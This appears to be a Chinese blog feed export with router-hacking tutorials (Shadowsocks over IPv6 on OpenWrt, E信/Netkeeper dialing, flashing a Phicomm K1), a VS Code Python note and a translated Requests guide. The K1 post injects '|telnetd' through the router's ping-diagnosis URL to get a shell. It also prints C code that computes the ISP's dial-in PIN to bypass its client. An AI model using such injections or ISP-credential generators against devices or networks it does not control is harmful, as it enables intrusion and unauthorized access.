为什么用Shadowsocks？配置简单，真的简单！以前看到过信息学院的学长写的一篇blog,原理是ipv6 to ipv4 从而ipv6 to ipv4网络,其实原理是一样的，只是他用了openvpn这个软件，但是感觉实现起来好难。像这样的开源支持ipv6协议的软件还是有很多的，这里就不再陈述。 回到原题为什么用Shadowsocks，配置简单。vps服务提供商搬瓦工现在为了迎合国人的需求现在已经预配了Shadowsocks,只需要点击以下安装就ok了。 适用对象具有ipv6地址、ipv4流量（计时）收费贵爱折腾的大学生。不推荐打国服游戏，延迟你懂的，但对延迟没要求的游戏还是可以玩的，美服、亚服、台服随你玩。 准备openwrt固件路由器路由器的刷机请自行Google,教程一大堆，刷机时笔者也遇到过很多问题，坚持！如果你的也是K1路由器，也要刷机，不妨看这个教程。刷机的重点是刷Shadowsocks插件，我的K1直接刷的来自恩山网友的固件，固件里已经附带了Shadowsocks。openwrt固件自取。openwrt控制面板上图。 Shadowsocks+ipv6节点信息因为笔者手里有台美国的vps，并且配置了Shadowsocks，所以现在拿来就直接用，老实说搭建的Shadowsocks平常很少用，之前觉得租这个vps很是浪费。但是自从寝室里有了这台全天候开机的路由器，值了！在这里我要强调一下，Shadowsocks的节点我们需要ipv6地址的，不然还是没法走校内的ipv6通道。 前方高能预警操作首先openwrt固件路由器登陆192.168.1.1，初始登录默认密码是：admin。登进去之后最好先不要对任何东西改动，按照正常路由器的配置对路由器进行拨号上网。然后选择Shadowsocks插件，选择启动。（为什么这样做呢？笔者尝试了几下，不拨号上网的话，Shadowsocks和DNS配置好了以后无法上网，最后总结，先拨号上网、再配置Shadowsocks和DNS信息） 步骤：点击 openwrt服务&gt;Shadowsocks，出现以下界面。 Shadowsocks的配置1234服务器ip： 密码： 服务器端口： 加密方式： 对Shadowsocks配置好了以后，点击下面的透明代理，选择启动。 对Shadowsocks配置好以后，我们的任务还没有结束，最重要的就是配置DNS信息。这里如果不配置DNS，IP地址选择ipv4的，Shadowsocks是国外的，那么通过这种方式使用Shadowsocks就是通过路由器来翻fq，在这里我就不多说了。 DNS的配置DNS设置有两种方案，一种是利用ChinaDNS，还有一种直接在DHCP/DNS设置页面（网络&gt;DHCP/DNS）进行填写。 由于本次折腾的特殊性，路由器工作在纯ipv6环境下，也就是说路由器没有ipv4的网络，但常用的DNS服务器大多是以ipv4地址方式提供的，如果使用ipv4的DNS服务器就会导致无法解析。此处用了[2001:470:0:c0::2]，但是很不幸，该DNS被污染了，无法解析如google，youtube一类网址，但是对国内的网站的解析很好。 12001:470:0:c0::2 其他的DNS最好选择Google的，相对的来说，网站解析最全面，而且还可以fq,只是一部分了，选择Google的公共DNS有一个缺点，就是像移动端的微信或者qq了，朋友圈的信息或公众号加载不出来，这是很蛋疼的事情。个人还是推荐上面的那条DNS,速度快、国内网站全面，几乎全覆盖。 下面是一些从网上找来的公共DNS，可以试验一下，说不定有什么以外的收获呢。 12345678910111213ordns.he.net 2001:470:20::2 74.82.42.42tserv1.fmt2.he.net 2001:470:0:45::2 72.52.104.74tserv1.dal1.he.net 2001:470:0:78::2 216.218.224.42tserv1.ams1.he.net 2001:470:0:7d::2 216.66.84.46tserv1.mia1.he.net 2001:470:0:8c::2 209.51.161.58tserv1.tor1.he.net 2001:470:0:c0::2 216.66.38.58ns.ipv6.uni-leipzig.de 2001:638:902:1::10 139.18.25.34 Google Public DNS123google-public-dns-a.google.com 2001:4860:4860::8888 8.8.8.8google-public-dns-b.google.com 2001:4860:4860::8844 8.8.4.4 码字不容易，在这里非常感谢_Echo和张哲两人的post. 转载自Dyhube]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[OpenWRT路由器使用ipv6拨号上网教程]]></title>
      <url>%2F2016%2F09%2F22%2FOpenwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BD%BF%E7%94%A8ipv6%E6%8B%A8%E5%8F%B7%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B.html</url>
      <content type="text"><![CDATA[文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除 原理介绍分析：湖北E信地区可以使用ipv6拨号，好处是网络是上下对等不限速网络，也就是说，你的端口上限是多少，网上就可以达到多少，我测试很多次，一般在100M左右，但是遗憾的是，该拨号方式只能使用32位系统，且由于E信软件的兼容性问题，很容易导致蓝屏死机。经过大神的抓包分析，该拨号方式是使用ipv6的隧道协议传递ipv4信号。而幸运的是，现在的openwrt支持该协议。也就是说可以使用基于openwrt的路由器采用ipv6拨号。 操作步骤：首先要明确是，该拨号方式也是需要进行账号换算的，首先启动路由器，并插上网线，在电脑上下载winscp这款软件，然后我们查询一下我们的ip地址，在电脑的dos界面输入ipconfig，找到以太网配置器 默认网关就是路由器的管理ip。 然后我们启动软件，按照图片设置填入数据 然后我们就进入了路由器的文件系统 接着，我们要做的是，进入路由器设置里面设置相关端口参数 在电脑的浏览器里输入管理ip地址 进入端口设置界面 首先设置wan口参数 切换协议为PPPOE，并随便输入账号密码（具体的拨号的账号密码在后面我们会加以更改）并在高级设置里勾选以下参数 然后保存并应用 然后我们设置lan口参数 按照该图设置 最后，我们回到接口总界面，自己创建一个端口 名字无所谓，但协议要选择rfc6333 提交以后填写ipv6的地址，经过大神的尝试，下面给的这个地址是比较稳定的，建议使用 240e:d:1000::ffff:1:并在高级设置里面勾选默认网关 在防火墙设置里，把这个链接拉到wan口里 最后保存 这样，路由器上的设置就结束了，下面转入配置文件的修改上 依次顺序进入到如下路径 双击network文件打开 并在文件的位置更改 然后点击保存 然后进入到此目录，上传我们准备的E信算法库文件 最后重启一下路由器，同步一下路由器的时间，就可以了注意，不同的芯片和不同地区的openwrt路由器，sxplugin.so文件是不一样的，具体请查看我上一篇文章打包的东西。 再说一次，文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[给斐讯K1刷机并拨号e信(湖北地区测试无问题)]]></title>
      <url>%2F2016%2F09%2F22%2F%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98.html</url>
      <content type="text"><![CDATA[◆购买斐讯k1路由器路由器在天猫京东斐讯旗舰店都有售卖，我买的价格是159，不过有一张铃铛卡，一个月之后返还160元，相当于0元购 ◆路由器刷不死Breed1.路由与电脑有线连接好，输入192.168.2.1，完成设置 2.在浏览器地址栏输入：http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd(如果你的电脑ip不是192.168.2.100,请改成你电脑的ip(内网ip)) 3.打开tftp，这里用tftp32演示，按图设置 4.打开CMD,务必使用管理员权限，telnet 192.168.2.1 5.输入用户名密码 6.输入命令12345678910111) cd /tmp2) tftp –g –l /tmp/breed.bin –r breed.bin 192.168.2.1003) cat /dev/mtd1 &gt;/tmp/mtd1.bin cat /dev/mtd0 &gt;/tmp/mtd0.bin4) tftp –p –r mtd1.bin –l /tmp/mtd1.bin 192.168.2.100 tftp –p –r mtd1.bin –l /tmp/mtd1.bin 192.168.2.1005) mtd_write write breed.bin Bootloader 等待出现#字 7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面 懒人一键式安装法：输入：wget http://breed.hackpascal.net/breed-mt7620-reset1.bin然后输入：mtd_write write breed-mt7620-reset1.bin Bootloader 等待出现#字（代表着已经完成） 刷breed后语只要路由breed不被变动，路由刷错固件也不怕，同样方式进入breed刷回正确的即可。 推荐每次刷完固件后，去固件系统管理–恢复原厂默认值。 ◆刷openWRT1.刷新固件我在下面的文件中打包了两个固件，一个是潘多拉的K1专版，一个是openWRT，我自己使用的是专版潘多拉，各位看官自己选择，刷新固件很简单，看图 点击更新，看路由灯全部亮起后，无线网络出现,OK ◆安装e信(NetKeeper)插件并进行拨号1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin.so2.通过WINSCP登录你的路由器 注意使用scp协议，密码admin（第一次登录op需要重设密码依然设为admin就可以了 3.放入拨号插件登录之后打开路由器，在这儿选择/(root）然后选择/usr/lib/pppd/2.4.7文件夹将你编辑好的sxplugin.so文件放入即可（ 这里的sxplugin.so是自己更名的，湖北的就选择wuhan的来更名，文件在文末有打包 ） 4.设置帐号密码拨号通过浏览器登录浏览器打开网络下的接口选择WAN口点击修改，协议选择PPPOE即可，然后下面有个按钮点一下会出来填帐号密码的，账户和密码也要写对，我是重庆动态密码可以正常用。（蓝字我是加了中文包的，你刷了过后是英文呢，凑合看吧，加中文包需要路由器联网。） 最后点击保存应用退出 5.最后的配置通过WINSCP登录路由器同样打开文件夹/etc/config/找到network修改 在图中的位置输入option ‘pppd_options’ ‘plugin sxplugin.so’这个代码即可（注意粘贴后字体是否一致，主要是‘号的问题，可保存后再打开查看，必须搞定字体格式才行），到此netkeeper就安装完了。最后重启路由器，到系统里面选时区，同步浏览器时间，保存。再到wan点击连接就能联网了。（如果进不去wan这个界面就是设置错了） 最后要说的，这个可用的原因是湖北地区e信2.5的算法依旧可用，有的地区加了心跳，有的地区强制升级了，并不可用,教程到此处完结，后面的有能力可以看看，工具教程打包在文末 ◆闪讯算法源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;string.h&gt;#include &lt;pppd/pppd.h&gt;#include &lt;pppd/md5.h&gt;typedef unsigned char byte;char pppd_version[] = VERSION;static char saveuser[MAXNAMELEN] = &#123;0&#125;;static char savepwd[MAXSECRETLEN] = &#123;0&#125;;static void getPIN(byte *userName, byte *PIN)&#123; int i,j;//循环变量 long timedivbyfive;//时间除以五 time_t timenow;//当前时间，从time()获得 byte RADIUS[16];//凑位字符 byte timeByte[4];//时间 div 5 byte beforeMD5[32];//时间 div 5+用户名+凑位 MD5_CTX md5;//MD5结构体 byte afterMD5[16];//MD5输出 byte MD501H[2]; //MD5前两位 byte MD501[3]; byte timeHash[4]; //时间div5经过第一次转后后的值 byte temp[32]; //第一次转换时所用的临时数组 byte PIN27[6]; //PIN的2到7位，由系统时间转换 //code info("sxplugin : using zjxinlisx01"); strcpy(RADIUS, "zjxinlisx01"); timenow = time(NULL); timedivbyfive = timenow / 5; for(i = 0; i &lt; 4; i++) &#123; timeByte[i] = (byte)(timedivbyfive &gt;&gt; (8 * (3 - i)) &amp; 0xFF); &#125; for(i = 0; i &lt; 4; i++) &#123; beforeMD5[i]= timeByte[i]; &#125; for(i = 4; i &lt; 16 &amp;&amp; userName[i-4]!='@' ; i++) &#123; beforeMD5[i] = userName[i-4]; &#125; j=0; while(RADIUS[j]!='\0') beforeMD5[i++] = RADIUS[j++]; MD5_Init(&amp;md5); MD5_Update (&amp;md5, beforeMD5, i); printf("%d %s\n",i,beforeMD5); MD5_Final (afterMD5, &amp;md5); MD501H[0] = afterMD5[0] &gt;&gt; 4 &amp; 0xF; MD501H[1] = afterMD5[0] &amp; 0xF; sprintf(MD501,"%x%x",MD501H[0],MD501H[1]); for(i = 0; i &lt; 32; i++) &#123; temp[i] = timeByte[(31 - i) / 8] &amp; 1; timeByte[(31 - i) / 8] = timeByte[(31 - i) / 8] &gt;&gt; 1; &#125; for (i = 0; i &lt; 4; i++) &#123; timeHash[i] = temp[i] * 128 + temp[4 + i] * 64 + temp[8 + i] * 32 + temp[12 + i] * 16 + temp[16 + i] * 8 + temp[20 + i] * 4 + temp[24 + i] * 2 + temp[28 + i]; &#125; temp[1] = (timeHash[0] &amp; 3) &lt;&lt; 4; temp[0] = (timeHash[0] &gt;&gt; 2) &amp; 0x3F; temp[2] = (timeHash[1] &amp; 0xF) &lt;&lt; 2; temp[1] = (timeHash[1] &gt;&gt; 4 &amp; 0xF) + temp[1]; temp[3] = timeHash[2] &amp; 0x3F; temp[2] = ((timeHash[2] &gt;&gt; 6) &amp; 0x3) + temp[2]; temp[5] = (timeHash[3] &amp; 3) &lt;&lt; 4; temp[4] = (timeHash[3] &gt;&gt; 2) &amp; 0x3F; for (i = 0; i &lt; 6; i++) &#123; PIN27[i] = temp[i] + 0x020; if(PIN27[i]&gt;=0x40) &#123; PIN27[i]++; &#125; &#125; PIN[0] = '\r'; PIN[1] = '\n'; memcpy(PIN+2, PIN27, 6); PIN[8] = MD501[0]; PIN[9] = MD501[1]; strcpy(PIN+10, userName);&#125;static int pap_modifyusername(char *user, char* passwd)&#123; byte PIN[MAXSECRETLEN] = &#123;0&#125;; getPIN(saveuser, PIN); strcpy(user, PIN); info("sxplugin : user is %s ",user);&#125;static int check()&#123; return 1;&#125;void plugin_init(void)&#123; info("sxplugin : init"); strcpy(saveuser,user); strcpy(savepwd,passwd); pap_modifyusername(user, saveuser); info("sxplugin : passwd loaded"); pap_check_hook=check; chap_check_hook=check;&#125; ◆下载地址 (访问码:4854)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Visual Studio Code配置Python开发环境]]></title>
      <url>%2F2016%2F06%2F29%2FVisual-Studio-Code%E9%85%8D%E7%BD%AEPython%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83.html</url>
      <content type="text"><![CDATA[1.安装Python插件在VScode界面按Crtl+Shift+P或者F1 输入ext install 直接安装Python，也就是点击它，然后等待，安装好后会提示你重启 2.配置运行Python程序同样的打开命令面板（Crtl+Shift+P或F1），然后输入Tasks: Configure Task Runner（中文输入：任务，然后选择任务：配置任务运行程序），选择Other 此时VScode会自动生成.vscode文件夹并生成一个默认的task.json 配置如下 &quot;version&quot;: &quot;0.1.0&quot;, &quot;command&quot;: &quot;python&quot;, &quot;isShellCommand&quot;: true, &quot;args&quot;: [&quot;${file}&quot;], &quot;showOutput&quot;: &quot;always&quot; 然后写完代码后Crtl+Shift+B运行Py程序]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python之Requests的高级用法]]></title>
      <url>%2F2016%2F06%2F10%2FPython%E4%B9%8BRequests%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95.html</url>
      <content type="text"><![CDATA[高级用法 本篇文档涵盖了Requests的一些更加高级的特性。 会话对象 会话对象让你能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookies。 会话对象具有主要的Requests API的所有方法。 我们来跨请求保持一些cookies: 1234567s = requests.Session()s.get('http://httpbin.org/cookies/set/sessioncookie/123456789')r = s.get("http://httpbin.org/cookies")print(r.text)# '&#123;"cookies": &#123;"sessioncookie": "123456789"&#125;&#125;' 会话也可用来为请求方法提供缺省数据。这是通过为会话对象的属性提供数据来实现的: 123456s = requests.Session()s.auth = ('user', 'pass')s.headers.update(&#123;'x-test': 'true'&#125;)# both 'x-test' and 'x-test2' are sents.get('http://httpbin.org/headers', headers=&#123;'x-test2': 'true'&#125;) 任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。 从字典参数中移除一个值有时你会想省略字典参数中一些会话层的键。要做到这一点，你只需简单地在方法层参数中将那个键的值设置为 None ，那个键就会被自动省略掉。 包含在一个会话中的所有数据你都可以直接使用。学习更多细节请阅读 会话API文档 。 请求与响应对象 任何时候调用requests.*()你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 requests 得到一个从 服务器返回的响应就会产生一个 Response 对象。该响应对象包含服务器返回的所有信息， 也包含你原来创建的 Request 对象。如下是一个简单的请求，从Wikipedia的服务器得到 一些非常重要的信息: 1&gt;&gt;&gt; r = requests.get('http://en.wikipedia.org/wiki/Monty_Python') 如果想访问服务器返回给我们的响应头部信息，可以这样做: 123456789&gt;&gt;&gt; r.headers&#123;'content-length': '56170', 'x-content-type-options': 'nosniff', 'x-cache':'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet', 'content-encoding':'gzip', 'age': '3080', 'content-language': 'en', 'vary': 'Accept-Encoding,Cookie','server': 'Apache', 'last-modified': 'Wed, 13 Jun 2012 01:33:50 GMT','connection': 'close', 'cache-control': 'private, s-maxage=0, max-age=0,must-revalidate', 'date': 'Thu, 14 Jun 2012 12:59:39 GMT', 'content-type':'text/html; charset=UTF-8', 'x-cache-lookup': 'HIT from cp1006.eqiad.wmnet:3128,MISS from cp1010.eqiad.wmnet:80'&#125; 然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部: 123&gt;&gt;&gt; r.request.headers&#123;'Accept-Encoding': 'identity, deflate, compress, gzip','Accept': '*/*', 'User-Agent': 'python-requests/0.13.1'&#125; Prepared Request 当你从API调用或Session调用得到一个Response对象，对于这个的request属性实际上是被使用的PreparedRequest，在某些情况下你可能希望在发送请求之前对body和headers(或其他东西)做些额外的工作，一个简单的例子如下: 123456789101112131415161718192021from requests import Request, Sessions = Session()req = Request('GET', url, data=data, headers=header)prepped = req.prepare()# do something with prepped.body# do something with prepped.headersresp = s.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout)print(resp.status_code) 因为你没有用Request对象做任何特别的事情，你应该立即封装它和修改 PreparedRequest 对象，然后携带着你想要发送到requests. 或 Session.的其他参数来发送它 但是，上面的代码会丧失一些Requests Session对象的优势，特别的，Session层的状态比如cookies不会被应用到你的其他请求中，要使它得到应用，你可以用Session.prepare_request()来替换 Request.prepare()，比如下面的例子: 12345678910111213141516171819202122from requests import Request, Sessions = Session()req = Request('GET', url, data=data headers=headers)prepped = s.prepare_request(req)# do something with prepped.body# do something with prepped.headersresp = s.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout)print(resp.status_code) SSL证书验证 Requests可以为HTTPS请求验证SSL证书，就像web浏览器一样。要想检查某个主机的SSL证书，你可以使用 verify 参数: 12&gt;&gt;&gt; requests.get('https://kennethreitz.com', verify=True)requests.exceptions.SSLError: hostname 'kennethreitz.com' doesn't match either of '*.herokuapp.com', 'herokuapp.com' 在该域名上我没有设置SSL，所以失败了。但Github设置了SSL: 12&gt;&gt;&gt; requests.get('https://github.com', verify=True)&lt;Response [200]&gt; 对于私有证书，你也可以传递一个CA_BUNDLE文件的路径给 verify 。你也可以设置 REQUEST_CA_BUNDLE 环境变量。 如果你将verify设置为False，Requests也能忽略对SSL证书的验证。 12&gt;&gt;&gt; requests.get('https://kennethreitz.com', verify=False)&lt;Response [200]&gt; 默认情况下， verify 是设置为True的。选项 verify 仅应用于主机证书。 你也可以指定一个本地证书用作客户端证书，可以是单个文件（包含密钥和证书）或一个包含两个文件路径的元组: 12&gt;&gt;&gt; requests.get('https://kennethreitz.com', cert=('/path/server.crt', '/path/key'))&lt;Response [200]&gt; 如果你指定了一个错误路径或一个无效的证书: 12&gt;&gt;&gt; requests.get('https://kennethreitz.com', cert='/wrong_path/server.pem')SSLError: [Errno 336265225] _ssl.c:347: error:140B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib 响应体内容工作流 默认情况下，当你进行网络请求后，响应体会立即被下载。你可以通过 stream 参数覆盖这个行为，推迟下载响应体直到访问 Response.content 属性: 12tarball_url = 'https://github.com/kennethreitz/requests/tarball/master'r = requests.get(tarball_url, stream=True) 此时仅有响应头被下载下来了，连接保持打开状态，因此允许我们根据条件获取内容: 123if int(r.headers['content-length']) &lt; TOO_LONG: content = r.content ... 你可以进一步使用 Response.iter_content 和 Response.iter_lines 方法来控制工作流，或者以 Response.raw 从底层urllib3的 urllib3.HTTPResponse &lt;urllib3.response.HTTPResponse 读取。 如果当你请求时设置stream为True，Requests将不能释放这个连接为连接池，除非你读取了全部数据或者调用了Response.close，这样会使连接变得低效率。如果当你设置 stream = True 时你发现你自己部分地读取了响应体数据(或者完全没读取响应体数据)，你应该考虑使用contextlib.closing,比如下面的例子: 1234from contextlib import closingwith closing(requests.get('http://httpbin.org/get', stream=True)) as r: # Do things with the response here. 保持活动状态（持久连接） 好消息 - 归功于urllib3，同一会话内的持久连接是完全自动处理的！同一会话内你发出的任何请求都会自动复用恰当的连接！ 注意：只有所有的响应体数据被读取完毕连接才会被释放为连接池；所以确保将 stream 设置为 False 或读取 Response 对象的 content 属性。 流式上传 Requests支持流式上传，这允许你发送大的数据流或文件而无需先把它们读入内存。要使用流式上传，仅需为你的请求体提供一个类文件对象即可: 12with open('massive-body') as f: requests.post('http://some.url/streamed', data=f) 块编码请求 对于出去和进来的请求，Requests也支持分块传输编码。要发送一个块编码的请求，仅需为你的请求体提供一个生成器（或任意没有具体长度(without a length)的迭代器）: 12345def gen(): yield 'hi' yield 'there'requests.post('http://some.url/chunked', data=gen()) POST 多个编码(Multipart-Encoded)文件 你可以在一个请求中发送多个文件，例如，假设你希望上传图像文件到一个包含多个文件字段‘images’的HTML表单 1&lt;input type=”file” name=”images” multiple=”true” required=”true”/&gt; 达到这个目的，仅仅只需要设置文件到一个包含(form_field_name, file_info)的元组的列表： 1234567891011&gt;&gt;&gt; url = 'http://httpbin.org/post'&gt;&gt;&gt; multiple_files = [('images', ('foo.png', open('foo.png', 'rb'), 'image/png')), ('images', ('bar.png', open('bar.png', 'rb'), 'image/png'))]&gt;&gt;&gt; r = requests.post(url, files=multiple_files)&gt;&gt;&gt; r.text&#123; ... 'files': &#123;'images': 'data:image/png;base64,iVBORw ....'&#125; 'Content-Type': 'multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a', ...&#125; 事件挂钩 Requests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理。 可用的钩子: response: 从一个请求产生的响应 你可以通过传递一个 {hook_name: callback_function} 字典给 hooks 请求参数 为每个请求分配一个钩子函数: 1hooks=dict(response=print_url) callback_function 会接受一个数据块作为它的第一个参数。 12def print_url(r): print(r.url) 若执行你的回调函数期间发生错误，系统会给出一个警告。 若回调函数返回一个值，默认以该值替换传进来的数据。若函数未返回任何东西， 也没有什么其他的影响。 我们来在运行期间打印一些请求方法的参数: 123&gt;&gt;&gt; requests.get('http://httpbin.org', hooks=dict(response=print_url))http://httpbin.org&lt;Response [200]&gt; 自定义身份验证 Requests允许你使用自己指定的身份验证机制。 任何传递给请求方法的 auth 参数的可调用对象，在请求发出之前都有机会修改请求。 自定义的身份验证机制是作为 requests.auth.AuthBase 的子类来实现的，也非常容易定义。 Requests在 requests.auth 中提供了两种常见的的身份验证方案： HTTPBasicAuth 和 HTTPDigestAuth 。 假设我们有一个web服务，仅在 X-Pizza 头被设置为一个密码值的情况下才会有响应。虽然这不太可能， 但就以它为例好了 123456789101112from requests.auth import AuthBaseclass PizzaAuth(AuthBase): """Attaches HTTP Pizza Authentication to the given Request object.""" def __init__(self, username): # setup any auth-related data here self.username = username def __call__(self, r): # modify and return the request r.headers['X-Pizza'] = self.username return r 然后就可以使用我们的PizzaAuth来进行网络请求: 12&gt;&gt;&gt; requests.get('http://pizzabin.org/admin', auth=PizzaAuth('kenneth'))&lt;Response [200]&gt; 流式请求 使用 requests.Response.iter_lines() 你可以很方便地对流式API（例如 Twitter的流式API ）进行迭代。简单地设置 stream 为 True 便可以使用 iter_lines() 对相应进行迭代: 12345678910import jsonimport requestsr = requests.get('http://httpbin.org/stream/20', stream=True)for line in r.iter_lines(): # filter out keep-alive new lines if line: print(json.loads(line)) 代理 如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求: 12345678import requestsproxies = &#123; "http": "http://10.10.1.10:3128", "https": "http://10.10.1.10:1080",&#125;requests.get("http://example.org", proxies=proxies) 你也可以通过环境变量 HTTP_PROXY 和 HTTPS_PROXY 来配置代理。123$ export HTTP_PROXY="http://10.10.1.10:3128"$ export HTTPS_PROXY="http://10.10.1.10:1080"$ python 12&gt;&gt;&gt; import requests&gt;&gt;&gt; requests.get("http://example.org") 若你的代理需要使用HTTP Basic Auth，可以使用 http://user:password@host/ 语法: 123proxies = &#123; "http": "http://user:pass@10.10.1.10:3128/",&#125; 合规性 Requests符合所有相关的规范和RFC，这样不会为用户造成不必要的困难。但这种对规范的考虑 导致一些行为对于不熟悉相关规范的人来说看似有点奇怪。 编码方式当你收到一个响应时，Requests会猜测响应的编码方式，用于在你调用 Response.text 方法时 对响应进行解码。Requests首先在HTTP头部检测是否存在指定的编码方式，如果不存在，则会使用 charade 来尝试猜测编码方式。 只有当HTTP头部不存在明确指定的字符集，并且 Content-Type 头部字段包含 text 值之时， Requests才不去猜测编码方式。 在这种情况下， RFC 2616 指定默认字符集 必须是 ISO-8859-1 。Requests遵从这一规范。如果你需要一种不同的编码方式，你可以手动设置 Response.encoding 属性，或使用原始的 Response.content 。(可结合上一篇安装使用快速上手中的 响应内容 学习) HTTP请求类型(附加例子) Requests提供了几乎所有HTTP请求类型的功能：GET，OPTIONS， HEAD，POST，PUT，PATCH和DELETE。 以下内容为使用Requests中的这些请求类型以及Github API提供了详细示例。 我将从最常使用的请求类型GET开始。HTTP GET是一个幂等的方法，从给定的URL返回一个资源。因而， 当你试图从一个web位置获取数据之时，你应该使用这个请求类型。一个使用示例是尝试从Github上获取 关于一个特定commit的信息。假设我们想获取Requests的commit a050faf 的信息。我们可以 这样去做: 12&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get('https://api.github.com/repos/kennethreitz/requests/git/commits/a050faf084662f3a352dd1a941f2c7c9f886d4ad') 我们应该确认Github是否正确响应。如果正确响应，我们想弄清响应内容是什么类型的。像这样去做: 1234&gt;&gt;&gt; if (r.status_code == requests.codes.ok):... print r.headers['content-type']...application/json; charset=utf-8 可见，GitHub返回了JSON数据，非常好，这样就可以使用 r.json 方法把这个返回的数据解析成Python对象。 1234567&gt;&gt;&gt; commit_data = r.json()&gt;&gt;&gt; print commit_data.keys()[u'committer', u'author', u'url', u'tree', u'sha', u'parents', u'message']&gt;&gt;&gt; print commit_data[u'committer']&#123;u'date': u'2012-05-10T11:10:50-07:00', u'email': u'me@kennethreitz.com', u'name': u'Kenneth Reitz'&#125;&gt;&gt;&gt; print commit_data[u'message']makin' history 到目前为止，一切都非常简单。嗯，我们来研究一下GitHub的API。我们可以去看看文档， 但如果使用Requests来研究也许会更有意思一点。我们可以借助Requests的OPTIONS请求类型来看看我们刚使用过的url 支持哪些HTTP方法。 123&gt;&gt;&gt; verbs = requests.options(r.url)&gt;&gt;&gt; verbs.status_code500 额，这是怎么回事？毫无帮助嘛！原来GitHub，与许多API提供方一样，实际上并未实现OPTIONS方法。 这是一个恼人的疏忽，但没关系，那我们可以使用枯燥的文档。然而，如果GitHub正确实现了OPTIONS， 那么服务器应该在响应头中返回允许用户使用的HTTP方法，例如： 123&gt;&gt;&gt; verbs = requests.options('http://a-good-website.com/api/cats')&gt;&gt;&gt; print verbs.headers['allow']GET,HEAD,POST,OPTIONS 转而去查看文档，我们看到对于提交信息，另一个允许的方法是POST，它会创建一个新的提交。 由于我们正在使用Requests代码库，我们应尽可能避免对它发送笨拙的POST。作为替代，我们来 玩玩GitHub的Issue特性。 本篇文档是回应Issue #482而添加的。鉴于该问题已经存在，我们就以它为例。先获取它。 12345678&gt;&gt;&gt; r = requests.get('https://api.github.com/repos/kennethreitz/requests/issues/482')&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; issue = json.loads(r.text)&gt;&gt;&gt; print issue[u'title']Feature any http verb in docs&gt;&gt;&gt; print issue[u'comments']3 Cool，有3个评论。我们来看一下最后一个评论。 12345678&gt;&gt;&gt; r = requests.get(r.url + u'/comments')&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; comments = r.json()&gt;&gt;&gt; print comments[0].keys()[u'body', u'url', u'created_at', u'updated_at', u'user', u'id']&gt;&gt;&gt; print comments[2][u'body']Probably in the "advanced" section 嗯，那看起来似乎是个愚蠢之处。我们发表个评论来告诉这个评论者他自己的愚蠢。那么，这个评论者是谁呢？ 12&gt;&gt;&gt; print comments[2][u'user'][u'login']kennethreitz 好，我们来告诉这个叫肯尼思的家伙，这个例子应该放在快速上手指南中。根据GitHub API文档， 其方法是POST到该话题。我们来试试看。 12345&gt;&gt;&gt; body = json.dumps(&#123;u"body": u"Sounds great! I'll get right on it!"&#125;)&gt;&gt;&gt; url = u"https://api.github.com/repos/kennethreitz/requests/issues/482/comments"&gt;&gt;&gt; r = requests.post(url=url, data=body)&gt;&gt;&gt; r.status_code404 额，这有点古怪哈。可能我们需要验证身份。那就有点纠结了，对吧？不对。Requests简化了多种身份验证形式的使用， 包括非常常见的Basic Auth。 12345678&gt;&gt;&gt; from requests.auth import HTTPBasicAuth&gt;&gt;&gt; auth = HTTPBasicAuth('fake@example.com', 'not_a_real_password')&gt;&gt;&gt; r = requests.post(url=url, data=body, auth=auth)&gt;&gt;&gt; r.status_code201&gt;&gt;&gt; content = r.json()&gt;&gt;&gt; print(content[u'body'])Sounds great! I'll get right on it. 精彩！噢，不！我原本是想说等我一会，因为我得去喂一下我的猫。如果我能够编辑这条评论那就好了！ 幸运的是，GitHub允许我们使用另一个HTTP动词，PATCH，来编辑评论。我们来试试。 1234567&gt;&gt;&gt; print(content[u"id"])5804413&gt;&gt;&gt; body = json.dumps(&#123;u"body": u"Sounds great! I'll get right on it once I feed my cat."&#125;)&gt;&gt;&gt; url = u"https://api.github.com/repos/kennethreitz/requests/issues/comments/5804413"&gt;&gt;&gt; r = requests.patch(url=url, data=body, auth=auth)&gt;&gt;&gt; r.status_code200 非常好。现在，我们来折磨一下这个叫肯尼思的家伙，我决定要让他急得团团转，也不告诉他是我在捣蛋。 这意味着我想删除这条评论。GitHub允许我们使用完全名副其实的DELETE方法来删除评论。我们来清除该评论。 12345&gt;&gt;&gt; r = requests.delete(url=url, auth=auth)&gt;&gt;&gt; 